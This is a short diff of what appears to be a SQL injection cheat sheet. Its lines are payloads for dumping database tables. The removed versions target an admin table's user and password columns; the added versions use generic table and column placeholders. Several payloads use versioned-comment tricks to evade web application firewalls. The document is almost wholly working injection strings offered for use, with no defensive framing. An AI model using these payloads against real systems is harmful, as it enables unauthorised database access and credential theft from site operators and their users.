@@ -1,7 +1,7 @@
-singel data dump : (SELECT+GROUP_CONCAT(user+SEPARATOR+0x3c62723e)+FROM+admin)
+singel data dump : (SELECT+GROUP_CONCAT(coloum+SEPARATOR+0x3c62723e)+FROM+table)
 
-singel data dump waf : (/!50000SELECT/(@x)FROM(/!50000SELECT/(@x:=0x00),(/!50000SELECT/(@x)FROM(admin)WHERE(@x)IN(@x:=/!50000CONCAT/(0x20,@x,user,0x3c62723e))))x)
+singel data dump waf : (/!50000SELECT/(@x)FROM(/!50000SELECT/(@x:=0x00),(/!50000SELECT/(@x)FROM(table)WHERE(@x)IN(@x:=/!50000CONCAT/(0x20,@x,coloum,0x3c62723e))))x)
 
-data dump waf : (/!50000SELECT/+/!50000GROUP_CONCAT(user ,0x203a3a20,pass+SEPARATOR+0x3c62723e)/+/!50000FROM/+admin )
+data dump waf : (/!50000SELECT/+/!50000GROUP_CONCAT(coloum ,0x203a3a20,coloum2+SEPARATOR+0x3c62723e)/+/!50000FROM/+table )
 
-data dump Dios : (/!50000SELECT/+/!50000GROUP_CONCAT(iuser,0x203a3a20, pass+SEPARATOR+0x3c62723e)/+/!50000FROM/+admin )
+data dump Dios : (/!50000SELECT/+/!50000GROUP_CONCAT(coloum1,0x203a3a20, coloum2+SEPARATOR+0x3c62723e)/+/!50000FROM/+table )
